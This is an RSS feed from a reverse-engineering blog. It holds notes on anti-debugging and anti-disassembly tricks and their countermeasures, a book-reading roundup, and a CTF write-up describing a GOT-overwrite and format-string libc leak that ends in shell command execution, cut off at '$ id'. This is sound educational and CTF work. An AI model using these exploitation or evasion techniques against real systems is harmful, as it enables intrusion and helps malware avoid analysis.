@@ -1,0 +1,660 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Grazfather</title>
+    <link>https://grazfather.github.io/</link>
+    <description>Recent content on Grazfather</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <lastBuildDate>Sun, 08 Dec 2019 12:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://grazfather.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>Anti-Debugging Techniques and Mitigation</title>
+        <link>https://grazfather.github.io/posts/2016-09-18-anti-debugging/</link>
+        <pubDate>Sun, 18 Sep 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-09-18-anti-debugging/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-09-18-anti-debugging/ -&lt;h2 id=&#34;techniques&#34;&gt;Techniques&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Windows&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;API methods:
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;IsDebuggerPresent&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;CheckRemoteDebuggerPresent&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;NtQueryInformationProcess&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;OutputDebugString&lt;/code&gt;/&lt;code&gt;GetLastError&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Manually checking structures
+&lt;ul&gt;
+&lt;li&gt;Check &lt;em&gt;BeingDebugged&lt;/em&gt; in PEB (in fs:[30]).&lt;/li&gt;
+&lt;li&gt;Check &lt;em&gt;ForceFlags&lt;/em&gt;:
+&lt;ul&gt;
+&lt;li&gt;In fs:[30][18][10] on Windows XP.&lt;/li&gt;
+&lt;li&gt;In fs:[30][18][44] on Windows 7 32 bit.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Check &lt;em&gt;Flags&lt;/em&gt;:
+&lt;ul&gt;
+&lt;li&gt;In fs:[30][18][0C] on Windows XP.&lt;/li&gt;
+&lt;li&gt;In fs:[30][18][40] on Windows 7 32 bit.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Check &lt;em&gt;NTGlobalFlag&lt;/em&gt; at &lt;code&gt;fs:[30][68] == 0x70&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Look for debuggers specifically:
+&lt;ul&gt;
+&lt;li&gt;Check registry.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;FindWindow(&amp;lt;debugger&amp;gt;)&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Look for executables on the file system.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Linux&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check &lt;em&gt;/proc/self/status&lt;/em&gt; for &lt;em&gt;TracerPid&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Try to attach using &lt;code&gt;ptrace&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Generic&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check memory for breakpoints (e.g. 0xCC on x86).&lt;/li&gt;
+&lt;li&gt;Code checksums (e.g. CRC).&lt;/li&gt;
+&lt;li&gt;Check timing (see if more time has elapsed between two points than expected, implying single stepping).
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;rdtsc&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;QueryPerformanceCounter&lt;/code&gt; on Windows.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;GetTickCount&lt;/code&gt; on Windows.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Mess with the debugger:
+&lt;ul&gt;
+&lt;li&gt;Use tls callbacks, which run before many debuggers attach (check for a PE&amp;rsquo;s .tls section).&lt;/li&gt;
+&lt;li&gt;Use exception, which are often handled by the debugger, or take too long to be passed to the application..&lt;/li&gt;
+&lt;li&gt;Insert bogus interrupts. e.g. &lt;code&gt;int 3&lt;/code&gt; (as 0xCC &lt;em&gt;and&lt;/em&gt; 0xCD03), &lt;code&gt;int 2D&lt;/code&gt; (kernel bp), &lt;code&gt;icebp&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Take advantage of debugger bugs or vulns:
+&lt;ul&gt;
+&lt;li&gt;Spotify used to crash OllyDBG.&lt;/li&gt;
+&lt;li&gt;Bad PE/ELF.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;NumberOfRvaAndSizes&lt;/em&gt; &amp;gt; 0x10 in &lt;em&gt;IMAGE_OPTIONAL_HEADER&lt;/em&gt; crashes OllyDBG 1.1.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;SizeOfRawData&lt;/em&gt; too big in &lt;em&gt;IMAGE_SECTION_HEADER&lt;/em&gt; crashes OllyDBG 1.1.&lt;/li&gt;
+&lt;li&gt;Calls to &lt;code&gt;OutputDebugString&lt;/code&gt; with &amp;ldquo;%s&amp;rdquo; token crashes OllyDBG 1.1.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;mitigation&#34;&gt;Mitigation&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;There are many plugins for OllyDBG, and newer windows debuggers tend to have them integrated.&lt;/li&gt;
+&lt;li&gt;Use hw breakpoints.&lt;/li&gt;
+&lt;li&gt;Break on these checks and fake the result.&lt;/li&gt;
+&lt;li&gt;Configure the debugger to immediately pass on certain exceptions.&lt;/li&gt;
+&lt;li&gt;Use a different debugger.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;When all else fails:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Find where the crash is, find the check and circumvent it.&lt;/li&gt;
+&lt;/ul&gt;
+- https://grazfather.github.io/posts/2016-09-18-anti-debugging/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Anti-Disassembly Techniques and Mitigation</title>
+        <link>https://grazfather.github.io/posts/2016-09-18-anti-disassembly/</link>
+        <pubDate>Sun, 18 Sep 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-09-18-anti-disassembly/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-09-18-anti-disassembly/ -&lt;p&gt;This is just a small collection of notes about disassembly and anti-disassembly tricks, and how to get around them.&lt;/p&gt;
+&lt;h2 id=&#34;how-disassemblers-work&#34;&gt;How disassemblers work&lt;/h2&gt;
+&lt;p&gt;The simplest disassembler is super simple, but they can also be very complicated. More advanced disassemblers try to recognize things like functions (which may have multiples &lt;em&gt;returns&lt;/em&gt;), idioms like jump tables, and not get tricked by anti-disassembly tricks. They come in two general categories.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Linear - Dissassembles all instructions in order, starting from some point (usually the entry point of a binary).&lt;/li&gt;
+&lt;li&gt;Flow-oriented - These follow jumps and calls and continue disassembling from their target. They also might stop disassembling after return instructions, so avoid showing instructions that are unreachable (and thus probably not code at all).&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Because flow-oriented disassemblers follow branchesm and because conditional branches exist, the disassembler has to make a decision. Often, for normal code, a disassembler can simply follow both (e.g. jump and don&amp;rsquo;t jump, disassemble from the target and from the next instruction). The problem is that there can be contradictary or incompatible jumps.&lt;/p&gt;
+&lt;h2 id=&#34;tricking-a-flow-oriented-disassembler&#34;&gt;Tricking a flow-oriented disassembler&lt;/h2&gt;
+&lt;p&gt;There are a variety of ways to trick a disassembler. Here are just a few:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Put two consecutive, but &amp;lsquo;opposite&amp;rsquo; conditional branches, e.g. a &lt;code&gt;jz&lt;/code&gt; followed by a &lt;code&gt;jnz&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use a constant condition, e.g. &lt;code&gt;xor eax, eax; jz &amp;lt;addr&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use a branch that does nothing, e.g. &lt;code&gt;call &amp;lt;addr&amp;gt;&lt;/code&gt;, then at &lt;em&gt;addr&lt;/em&gt;: &lt;code&gt;pop &amp;lt;reg&amp;gt;&lt;/code&gt;. This is commonly used in shellcode to get an address of in-band data, since on x86 it&amp;rsquo;s the easiest way to get an address around the PC.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use a series of bytes that will be executed more than once, as different instructions, depending where the PC lies. e.g. &lt;code&gt;EB FF C0 48&lt;/code&gt;. When a disassembler disassembles this (as x86), it&amp;rsquo;ll see &lt;code&gt;EB FF&lt;/code&gt; as &lt;code&gt;jmp 1&lt;/code&gt;, then &lt;code&gt;C0&lt;/code&gt;, which isn&amp;rsquo;t a valid opcode, and finally &lt;code&gt;48&lt;/code&gt; as &lt;code&gt;dec eax&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The problem is that this isn&amp;rsquo;t how it&amp;rsquo;s executed! the &lt;code&gt;jmp 1&lt;/code&gt; jumps one byte from the start of the instruction (or rather jumps -1 bytes (0xFF) from the end of the instruction). This makes the EIP land on the 0xFF. Now the CPU decodes &lt;code&gt;FF C0&lt;/code&gt; as &lt;code&gt;inc eax&lt;/code&gt; and &lt;code&gt;48&lt;/code&gt; and &lt;code&gt;dec eax&lt;/code&gt;. In the end. this code basically does nothing. The solution here: NOP out all four bytes.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Abuse &lt;code&gt;call&lt;/code&gt; and &lt;code&gt;ret&lt;/code&gt; to mess up function boundaries. e.g. &lt;code&gt;E8 00 00 00 00 C3&lt;/code&gt;, which is &lt;code&gt;call 5; ret&lt;/code&gt;. This will push the return address onto the stack, which will be the byte right after the &lt;code&gt;ret&lt;/code&gt;. The &lt;code&gt;ret&lt;/code&gt; will then pop off this address into the PC, which effectively makes this two intruction combo useless. However, this cal make the disassembler think that the function ends there and that the next instruction is the end of another function.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Heavy use of function pointers. While this can be done without the intent of making the reverse engineer&amp;rsquo;s life more difficult, it has the same effect. Essentially, the address will have cross references to whenever the pointer is copied, but when it is &lt;em&gt;called&lt;/em&gt;, since it&amp;rsquo;s called from a register or memory address, the disassembler usually can&amp;rsquo;t determine when it&amp;rsquo;s used.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;mitigation&#34;&gt;Mitigation&lt;/h2&gt;
+&lt;p&gt;The most difficult part in getting around these tricks isn&amp;rsquo;t anything to do with patching around them &amp;ndash; That&amp;rsquo;s trivial. The trick is in identifying them quickly and not wasting your time figuring out what they do. That can only be done, really, with practice. Most of all the anti-disassembly I&amp;rsquo;ve learned I learned from the amazing book &lt;a href=&#34;http://www.nostarch.com/malware&#34;&gt;Practical Malware Analysis&lt;/a&gt; in chapter 16. The book includes labs, which I recommend you do. You can see my writeups &lt;a href=&#34;https://github.com/Grazfather/PracticalMalwareLabs/blob/master/chapter16/readme.md&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Once they&amp;rsquo;re identified, IDA Pro makes it &lt;em&gt;mostly&lt;/em&gt; easy to fix. My favourite way to fix them, for the most part, is by using &lt;code&gt;PatchByte&lt;/code&gt;. This can be done from the &amp;lsquo;File &amp;gt; IDC Command&amp;hellip;&amp;rsquo; dialog, and if you don&amp;rsquo;t want to supply the address, you can use &lt;code&gt;ScreenEA&lt;/code&gt; to use the address of the cursor. This usually looks like &lt;code&gt;PatchByte(ScreenEA(), 0x90);&lt;/code&gt;. Make sure to run it for each byte you want to remove.&lt;/p&gt;
+&lt;p&gt;When you know which function is being called from a function pointer (obviously being careful for when more than one function is called from this location) you can add an xref manually using &lt;code&gt;AddCodeXref&lt;/code&gt;. You&amp;rsquo;d use is as so &lt;code&gt;AddCodeXref(ScreenEA(), &amp;lt;addr of function&amp;gt;, fl_CN);&lt;/code&gt;, making sure you&amp;rsquo;ve selected the call instruction. You can do the same for jumps, substituting &lt;em&gt;fl_CN&lt;/em&gt; for &lt;em&gt;fl_JN&lt;/em&gt;.&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-09-18-anti-disassembly/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>My Reading Summary - June-August 2016</title>
+        <link>https://grazfather.github.io/posts/2016-09-01-reading-june-august-2016/</link>
+        <pubDate>Thu, 01 Sep 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-09-01-reading-june-august-2016/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-09-01-reading-june-august-2016/ -&lt;p&gt;&lt;strong&gt;Wool Omnibus&lt;/strong&gt; (Audiobook) - I picked this up because it was something like $3. I had already read the original &lt;em&gt;Wool&lt;/em&gt; a few times and enjoyed it, and I enjoyed this one as much. This book takes place in an underground silo where a group of people has lived for generations. Their only view to the outside world is through a camera that points to the bleak post-apocalyptic world outside. The dust builds up on the lens, however, so it must be cleaned (with wool pads, where the book gets its name), so they send out their criminals (which is a death sentence). The book starts with the former sheriff who doesn&amp;rsquo;t understand why his wife wanted to do a cleaning, and it eventually leads him to believe there&amp;rsquo;s something more that those in the know are hiding. At the risk of spoiling the books a bit: There is indeed a conspiracy: There are more silos, and they all think they&amp;rsquo;re alone. While I enjoyed the light mystery and in general like the &amp;lsquo;post apocalyptic&amp;rsquo; genre, I don&amp;rsquo;t remember what happens at the end, so I think that hints that I wasn&amp;rsquo;t totally enthralled.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Obstacle Is The Way&lt;/strong&gt; (Audiobook) - I picked this up since I like Ryan Holiday&amp;rsquo;s book &lt;em&gt;Trust Me, I&amp;rsquo;m Lying&lt;/em&gt;. This is a short [audio]book that sort of extolls the virtues of stoicism. While I think it&amp;rsquo;s probably a good mindset to have overall, I didn&amp;rsquo;t find it very interesting. It&amp;rsquo;s a short read/listen, though, so it might be worth picking up.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The 4-Hour Workweek&lt;/strong&gt; (Audiobook) - This is a &amp;lsquo;classic&amp;rsquo; by Tim Ferris about what you need to do to earn the lifestyle where you can make money while spending most of your time doing whatever you want (e.g. traveling). While I think there is a good amount of valuable advice, I also think the book is starting to get dated, and since I sometimes listen to his podcast I think a lot of it seemed rehashed (though this is apparently the source material).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Programming Interviews Exposed&lt;/strong&gt; - I went through the exercises in this book to get ready to interview at a few places for a new job. I found the exercises very helpful, and the quick summary at the start of the chapter some of the best quick notes on computer science fundamentals. That said, the exercises are &lt;em&gt;very&lt;/em&gt; easy, and I wouldn&amp;rsquo;t have done well if I counted on these exercises alone. I&amp;rsquo;d still recommend it, but I&amp;rsquo;d also recommend some more advanced books like &lt;em&gt;Cracking the Coding Interview&lt;/em&gt; (Which I had read years ago) and &lt;em&gt;Elements of Programming Interviews&lt;/em&gt; (Which has great questions but horrible introductions and is very dense).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Mobile Application Hacker&amp;rsquo;s Handbook&lt;/strong&gt; - This book contains a lot of relevant information about the current ecosystem of mobile apps and their security. I found a good amount of information, but I also found it quite boring. The book is quite tool-focused (they love an Android tool called &lt;a href=&#34;https://labs.mwrinfosecurity.com/tools/drozer&#34;&gt;Drozer&lt;/a&gt;) and will probably feel out of date rather quickly. Still though, I think it does do a decent job at covering the different types of vulnerabilites, how to exploit them, and how to prevent them, for each modern platform.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Ender&amp;rsquo;s Shadow&lt;/strong&gt; (Audiobook) - I enjoyed &lt;em&gt;Ender&amp;rsquo;s Game&lt;/em&gt; and had been meaning to read this book for years now. This book follows the character &amp;ldquo;Bean&amp;rdquo; as he fights to survive in the streets until he&amp;rsquo;s working along Ender commanding battleships against the buggers. I might like it more than the original because it&amp;rsquo;s a bit darker, and I found Bean&amp;rsquo;s life on the streets more interesting than Ender&amp;rsquo;s mostly okay privileged life. The way the story &amp;lsquo;syncs up&amp;rsquo; with Ender&amp;rsquo;s game (since they occur in parallel) I think was particularly well done.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The IDA Pro Book&lt;/strong&gt; - I&amp;rsquo;d recommend this book to anyone who wants to get better with IDA Pro. IDA has so many features that many barely scratch the surface of its rich featureset. I know many skilled reverse engineers, for example, who have never written a line of IDAPython, or have never made any user-defined types. I found a few chapters super boring and irrelevent to me, but maybe that&amp;rsquo;s just because I haven&amp;rsquo;t felt the need to write a loader or a processer module. I&amp;rsquo;ve &lt;em&gt;definitely&lt;/em&gt; learned a lot of useful things about IDA because of this booko.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Fellowship of The Ring&lt;/strong&gt; - I had originally tried to read this book when I was around 12 but I couldn&amp;rsquo;t get past the overly long dialogue. I gave it another shot and I am glad I did. While I wasn&amp;rsquo;t wrong back then that this book is overly wordy, I didn&amp;rsquo;t find it anything over-the-top like I feared (I have read much more boring books). There were parts in this book that I really enjoyed that I wish had made it into the movies, but overall found it to be a great complement. Like the movie, this book follows Frodo on his mission to destroy The Ring. The book ends very nearly where the movie does as well, but cuts out Boromir&amp;rsquo;s death, making it somewhat less climactic. The pacing is also very different, which gave it a refreshing feel since was able to let the story surprise me. One example of the different pacing is that Bilbo&amp;rsquo;s birthday takes place &lt;em&gt;13 years&lt;/em&gt; before Frodo leaves in the books, but it seems only a few days in the movie. I&amp;rsquo;d definiely recommend this book to any fan of the movies.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Two Towers&lt;/strong&gt; - I enjoyed this book a lot. With some great battles I found the pacing better, and the politics of the different realms came into play more. It&amp;rsquo;s interesting to contrast this with how the &lt;em&gt;A Song of Ice and Fire&lt;/em&gt; (&lt;em&gt;Game of Thrones&lt;/em&gt;) series does politics, and battle. The LOTR is obviously a lot more family friendly. This battle covers the battle for Helm&amp;rsquo;s Deep which I think was done well and didn&amp;rsquo;t have any of the parts I found annoying in the movie (e.g. Gimli being nothing more than comic relief).&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;A Short History of Nearly Everything&lt;/strong&gt; (Audiobook) - I found this book incredibly interesting. Bill Bryson seamlessly flows through time and across fields as our understanding of the world improves. He gets into the politics of the discoveries (and often credits those whom popular history seems to have forgotten) and reminds us of the state of the world at the time, which creates a better picture of how the discoveries may have changed the world. While it covers a huge breadth, I don&amp;rsquo;t think it suffers on depth. If anything, it goes just deep enough to perhaps invigorate a feeling of curiosity that might precipitate more independent research on the subject.&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-09-01-reading-june-august-2016/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>CTF(x) - Binary 250 - Dat Boinary</title>
+        <link>https://grazfather.github.io/posts/2016-08-28-ctfx-dat-boinary/</link>
+        <pubDate>Sun, 28 Aug 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-08-28-ctfx-dat-boinary/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-08-28-ctfx-dat-boinary/ -&lt;p&gt;For this challenge we&amp;rsquo;re provided the binary and a &lt;em&gt;libc.so.6&lt;/em&gt; binary. Just by being provided this second binary we are hinted that we will need some fuctionality from it: Rop or ret2libc probably.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;grazfather ~/code/CTFs/ctfx&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ file dat-boinary
+dat-boinary: ELF 32-bit LSB executable, Intel 80386, version &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SYSV&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, dynamically linked &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uses shared libs&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; GNU/Linux 2.6.32, not stripped&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;I&amp;rsquo;ve recently bought the personal edition of &lt;a href=&#34;http://binary.ninja&#34;&gt;Binary Ninja&lt;/a&gt;, and so will be using it for most of my static analysis.&lt;/p&gt;
+&lt;p&gt;Popping it into binja we (happily) see that it&amp;rsquo;s a rather small binary. &lt;code&gt;main&lt;/code&gt; is rather simple, with a menu system and a large loop, and what looks like no exit.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-08-28-CTFx-Dat-Boinary-main.png&#34; alt=&#34;main&#34;&gt;&lt;/p&gt;
+&lt;p&gt;First a buffer of 0x80 bytes is allocated and its pointer stored at $ebp - 0x14 (&lt;em&gt;buf_ptr&lt;/em&gt;). We&amp;rsquo;re prompted for an ID, which is at most 9 bytes (including the null) and stored locally, at $ebp - 0x20 (&lt;em&gt;ID&lt;/em&gt;).&lt;/p&gt;
+&lt;p&gt;Next the menu is printed:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;What would you like to &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;?
+1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; upd4te th3 1d of y0ur meme.
+2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; Updat3 the d4nkn3ss of your m3m3.
+3&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; upd4te the c0ntent of your maymay.
+4&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; pR1nT th3 c0nT3nT of ur memey.
+5&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; s00p3r s3cr3t meme 0pt10n.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Reversing item by item we see the following:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;strlen(ID)&lt;/code&gt; is called and its lenght is provided to &lt;code&gt;fread&lt;/code&gt; (instead of &lt;code&gt;fgets&lt;/code&gt; like the first time).&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;read_number&lt;/code&gt; is called, and its return value is stored at ebp - 0x10 (&lt;em&gt;dankness&lt;/em&gt;), it&amp;rsquo;s compared to 0x80, the size of the allocated buffer, and if greater or equal, or signed, the nothing happens. If the value is in range, however, the &amp;lsquo;dankness&amp;rsquo; is copied to ebp - 0x18.&lt;/li&gt;
+&lt;li&gt;The value at ebp - 0x18 (&lt;em&gt;size&lt;/em&gt;) is checked to be valid. If in range, &lt;code&gt;fgets&lt;/code&gt; is called to write to &lt;em&gt;buf_ptr&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Simply calls &lt;code&gt;printf(&amp;quot;%s&amp;quot;, buf_ptr);&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;secret_meme(ID)&lt;/code&gt; is called. This function is not too short, but the only interesting part is right at the start:
+&lt;img src=&#34;https://grazfather.github.io/assets/2016-08-28-CTFx-Dat-Boinary-secret_meme.png&#34; alt=&#34;secret_meme&#34;&gt;
+It writes 0x69696969 to &lt;code&gt;(buf + 8)&lt;/code&gt;. Since this function is passed the address of the ID in &lt;code&gt;main&lt;/code&gt;&#39;s stack frame (0x20), this will write to main&amp;rsquo;s local at ebp - 0x18, which is &lt;em&gt;size&lt;/em&gt;, which used to determine how much to write into the heap buf.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;With these functions figured out, this is what main&amp;rsquo;s stack frame looked like:
+&lt;img src=&#34;https://grazfather.github.io/assets/2016-08-28-CTFx-Dat-Boinary-stack_frame.png&#34; alt=&#34;main&amp;rsquo;s locals&#34;&gt;&lt;/p&gt;
+&lt;p&gt;While using &lt;code&gt;secret_meme&lt;/code&gt; might look like a good way to get a huge write into the heap buffer, that is not actually where the vulnerability lies. The size is checked that it&amp;rsquo;s in range, anyway. Instead, this function helps us because it can wipe out &lt;em&gt;ID&lt;/em&gt;&amp;rsquo;s null byte: Provided an eight-byte ID the null byte will lie over the first byte of &lt;em&gt;size&lt;/em&gt;. By overwriting this we can change our ID, and the &lt;code&gt;strlen&lt;/code&gt; call will not return 8 (or less) but instead &lt;code&gt;8 + sizeof(size) + sizefof(buf_ptr)&lt;/code&gt;, and will keep going until it finds a null byte. What is important, though, is that this will allow us to overwrite &lt;em&gt;buf_ptr&lt;/em&gt;, and then we can use menu option 3 to write &lt;em&gt;at&lt;/em&gt; this selected address.&lt;/p&gt;
+&lt;p&gt;To write to this address, though, I needed to pass the size check, but &lt;code&gt;secret_meme&lt;/code&gt; had placed an invalid value, and anyway I had overwritten it again on my way to overwriting &lt;em&gt;buf_size&lt;/em&gt;. I could have used the second menu item to reset the size, but I instead just made sure to write a valid size when I was overwriting these bytes.&lt;/p&gt;
+&lt;p&gt;With a write-what-where primitive I can pretty much do what I want, but I don&amp;rsquo;t know the address of the stack, so I will have to attack the &lt;em&gt;global offset table&lt;/em&gt;. Here I made it more difficult than I needed, but bear with me.&lt;/p&gt;
+&lt;p&gt;I know that I needed to leak the address of something in libc, so that I could calculated the offset from there to &lt;code&gt;system&lt;/code&gt;, and then patch that address into some import&amp;rsquo;s entry in the GOT. My idea was to replace &lt;code&gt;atoi@got&lt;/code&gt;, which is used in the menu, with the address of &lt;code&gt;printf@plt&lt;/code&gt;. This would allow me to provide format strings to the menu system to leak addresses on the stack. An added benefit is that I could still use the menu, because &lt;code&gt;printf&lt;/code&gt; returns the number of bytes printed, so to select item 3, for example, it&amp;rsquo;d just have to pass a string that prints three bytes.&lt;/p&gt;
+&lt;p&gt;One interesting thing I noticed about Binary Ninja is that they seem to name some of their symbols incorrectly. When finding the address of &lt;code&gt;atoi@got&lt;/code&gt;, I got myself pretty confused. What binja labels as &lt;code&gt;atoi&lt;/code&gt; is &lt;em&gt;actually&lt;/em&gt; &lt;code&gt;atoi@plt&lt;/code&gt;. What they label as &lt;code&gt;atoi@plt&lt;/code&gt; is &lt;code&gt;atoi@got.plt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-08-28-CTFx-Dat-Boinary-atoi_plt_binja.png&#34; alt=&#34;leaking libc&#34;&gt;
+According to Binary Ninja
+&lt;img src=&#34;https://grazfather.github.io/assets/2016-08-28-CTFx-Dat-Boinary-atoi_plt_gdb.png&#34; alt=&#34;leaking libc&#34;&gt;
+According to GDB.&lt;/p&gt;
+&lt;p&gt;Inspecting the stack I could see that &lt;code&gt;__libc_start_main+243&lt;/code&gt; is on the stack, and would be the 23rd element printed. This means that provided the string &amp;ldquo;%23$X&amp;rdquo; would print out that address.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-08-28-CTFx-Dat-Boinary-leak_libc.png&#34; alt=&#34;leaking libc&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now reading this address and using binja to find the address of &lt;code&gt;__libc_start_main&lt;/code&gt; and &lt;code&gt;system&lt;/code&gt; I could calculate the offset. I could use this offset and the leaked run-time address to find the address of &lt;code&gt;system&lt;/code&gt; in memory.&lt;/p&gt;
+&lt;p&gt;With the address of &lt;code&gt;system&lt;/code&gt; on hand, I had to write to the &lt;code&gt;atoi@got&lt;/code&gt; entry again, replacing &lt;code&gt;printf@plt&lt;/code&gt; with &lt;code&gt;system&lt;/code&gt;. This was done simply by passing a string of length three bytes (including the newline) to &lt;code&gt;printf&lt;/code&gt; to select menu item 3.&lt;/p&gt;
+&lt;p&gt;Finally, with the pointer in place, I simply needed to enter shell command I wanted into the menu system.&lt;/p&gt;
+&lt;p&gt;Now while this worked fine, I noticed later that I had made it more complicated than I needed to: Menu item 4 would print out the value at &lt;code&gt;buf_addr&lt;/code&gt;, and when I filled it with the address of &lt;code&gt;atoi@got&lt;/code&gt;, that value woudl be the address of &lt;code&gt;atoi&lt;/code&gt; (since it had already been called and so already resolved). This would get me my libc address leak without needing a format string.&lt;/p&gt;
+&lt;p&gt;Either way, I had a working exploit:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;   $ id
